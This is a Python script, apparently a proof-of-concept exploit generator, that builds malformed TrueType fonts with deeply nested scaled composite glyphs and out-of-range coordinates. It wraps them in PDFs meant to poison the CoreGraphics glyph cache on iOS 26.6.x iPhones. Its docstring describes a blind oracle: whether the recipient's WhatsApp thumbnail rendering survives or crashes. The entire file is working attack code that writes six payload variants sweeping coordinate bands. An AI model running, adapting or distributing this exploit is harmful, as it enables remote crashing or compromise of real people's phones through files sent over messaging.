#!/usr/bin/env python3
"""ORACLE-PDF v1 for iOS 26.6.x (iPhone 11 / 12 family, arm64e).
CG glyph-cache poison in RIP-41b form: record+teardown carried by the font's
data_release_info-equivalent path, decode2 clean. Blind oracle: receiver's WA
thumbnail generation either survives (bit 0) or WA dies on render (bit 1).
L-band sweeps the int16 glyph-coord space; m16k = aggressive.
Stdlib + fontTools only. Output: oracle_v1_<tag>.pdf
"""
import sys, zlib
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

UPM, N, DX = 16384, 9, 33
SCALE = 32767 / 16384
PTSIZE = 1024

def build_font(L):
    names = [".notdef", "leaf"] + [f"c{i}" for i in range(N - 1)] + ["A"]
    fb = FontBuilder(UPM, isTTF=True)
    fb.setupGlyphOrder(names)
    fb.setupCharacterMap({ord("A"): "A"})
    p = TTGlyphPen(None)
    p.moveTo((0, 0));  p.lineTo((DX, 0));  p.lineTo((DX, 40));  p.lineTo((0, 40));  p.closePath()
    p.moveTo((L, 1));  p.lineTo((L, 39));  p.closePath()
    glyf = {"leaf": p.glyph()}
    p = TTGlyphPen(None)
    p.moveTo((0, 0));  p.lineTo((1, 0));  p.lineTo((1, 1));  p.closePath()
    glyf[".notdef"] = p.glyph()
    gs = dict.fromkeys(names); prev = "leaf"
    for name in names[2:]:
        p = TTGlyphPen(gs)
        p.addComponent(prev, (SCALE, 0, 0, SCALE, 0, 0))
        glyf[name] = p.glyph();  prev = name
    fb.setupGlyf(glyf)
    fb.setupHorizontalMetrics({n: (100, 0) for n in names})
    fb.setupHorizontalHeader(ascent=100, descent=-100)
    fb.setupOS2(); fb.setupNameTable({"familyName": "T", "styleName": "R"}); fb.setupPost()
    fb.font["maxp"].maxComponentDepth = N
    fb.font.recalcBBoxes = False
    for g in glyf.values():
        g.xMin = g.yMin = 0; g.xMax = DX; g.yMax = 40
    fb.font["head"].xMin = 0; fb.font["head"].xMax = DX
    fb.font["head"].yMin = 0; fb.font["head"].yMax = 40
    import io
    b = io.BytesIO(); fb.save(b)
    return b.getvalue()

def wrap_pdf(ttf, title):
    ttf_z = zlib.compress(ttf)
    stream = f"BT /F1 {PTSIZE} Tf 5 5 Td (A) Tj ET\n".encode()
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
        b"/Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>",
        b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"endstream",
        b"<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont "
        b"/FirstChar 65 /LastChar 65 /Widths [100] "
        b"/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>",
        b"<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 "
        b"/FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
        b"/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>",
        b"<< /Length %d /Length1 %d /Filter /FlateDecode >>\nstream\n"
        % (len(ttf_z), len(ttf)) + ttf_z + b"\nendstream",
    ]
    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    off = []
    for i, body in enumerate(objs, 1):
        off.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in off:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))
    return bytes(out)

if __name__ == "__main__":
    bands = (("m16k", -16000), ("m12k", -12000), ("m8k", -8000), ("m4k", -4096),
             ("wild", 32000), ("p16k", 16000))
    for tag, L in bands:
        pdf = wrap_pdf(build_font(L), tag)
        fn = f"oracle_v1_{tag}.pdf"
        open(fn, "wb").write(pdf)
        print(f"{fn} L={L} bytes={len(pdf)}")
